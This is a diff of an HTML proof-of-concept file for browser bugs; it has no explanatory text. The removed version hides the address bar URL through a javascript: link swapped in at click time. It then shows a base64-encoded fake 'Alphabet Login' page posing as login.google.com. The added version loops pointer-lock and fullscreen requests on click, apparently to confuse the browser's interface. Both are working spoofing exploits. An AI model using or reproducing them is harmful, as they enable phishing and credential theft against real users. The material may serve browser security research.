@@ -1,32 +1,26 @@
-<html>
-<head>
-<title>FF-URL-hiding - @qab</title>
-</head>
-<body>
-<a id='q' href='https://login.google.com/'>Click here</a>
+<html onclick=main()>
+
 <script>
-//this is our payload, it contains the second part of this trick.
-/*source code of payload:
+    function main() {
 
-<h2>Wlecome to Alphabet Login!</h2>
-<script>
-(function() {//This is to set the favicon
-    var q = document.createElement('link');
-    q.type = 'image/x-icon';
-    q.rel = 'shortcut icon';
-    q.href = 'http://www.google.com/favicon.ico';
-    document.getElementsByTagName('head')[0].appendChild(q);
-}());
+        var startCollison = setInterval(function () {
+            pointerLockElement.requestPointerLock();
+            fullscreenElement.appendChild(pointerLockElement)
+        }, 1)
 
-setTimeout(q=>{location.reload()},1);//This will try to reload our javascript URL, however, the q variable this time is not set.
-window.document.title='https://login.google.com/';
-<\/script>
-//Since an error is thrown regarding the variable 'q' something weird happens where the URL just vanishes.
-*/
-var payload='PGgyPldsZWNvbWUgdG8gQWxwaGFiZXQgTG9naW4hPC9oMj4KPHNjcmlwdD4KKGZ1bmN0aW9uKCkgewogICAgdmFyIHEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdsaW5rJyk7CiAgICBxLnR5cGUgPSAnaW1hZ2UveC1pY29uJzsKICAgIHEucmVsID0gJ3Nob3J0Y3V0IGljb24nOwogICAgcS5ocmVmID0gJ2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS9mYXZpY29uLmljbyc7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdLmFwcGVuZENoaWxkKHEpOwp9KCkpOwoKc2V0VGltZW91dChxPT57bG9jYXRpb24ucmVsb2FkKCl9LDEpOwp3aW5kb3cuZG9jdW1lbnQudGl0bGU9J2h0dHBzOi8vbG9naW4uZ29vZ2xlLmNvbS8nOwoKPC9zY3JpcHQ+';
-var ql='javascript:q;`<script>if(location!=this.location){location=this.location}else{document.write(atob("'+payload+'"))}<\/script>`';
+        fullscreenElement.requestFullscreen();
 
-q.addEventListener("click",$=>{q.href=ql;});//We replace the href right before the user clicks it.
+        setTimeout(function () {
+            clearInterval(startCollison)
+        }, 333)
+
+    }
 </script>
-</body>
+
+
+<div id="pointerLockElement"></div>
+
+<div id="fullscreenElement">
+</div>
+
 </html>
